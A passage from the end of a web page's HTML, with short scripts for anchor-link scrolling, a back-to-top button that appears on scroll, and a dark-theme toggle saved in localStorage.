                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
